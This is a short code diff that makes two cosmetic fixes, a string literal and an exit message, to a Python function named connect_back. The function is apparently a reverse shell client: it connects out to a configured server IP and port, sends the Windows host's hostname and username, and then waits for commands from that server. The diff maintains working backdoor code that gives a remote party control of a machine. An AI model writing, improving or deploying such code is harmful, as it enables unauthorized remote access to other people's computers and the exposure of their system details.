@@ -22,7 +22,7 @@ def connect_back():
             client.connect((SERVER_IP, SERVER_PORT))
             print("[*] Connected to server")
 
-            info = f"[*] Windows host connected"
+            info = "[*] Windows host connected"
             info += f"[*] Hostname: {os.environ.get('COMPUTERNAME', 'Unknown')}\n"
             info += f"[*] Username: {os.environ.get('USERNAME', 'Unknown')}\n"
             client.send(info.encode() + b"\n")
@@ -32,7 +32,7 @@ def connect_back():
                 if not cmd:
                     break
                 if cmd.lower() in ["exit", "quit"]:
-                    client.send(b"EXITIN...")
+                    client.send(b"EXITING...")
                     break
 
                 try:
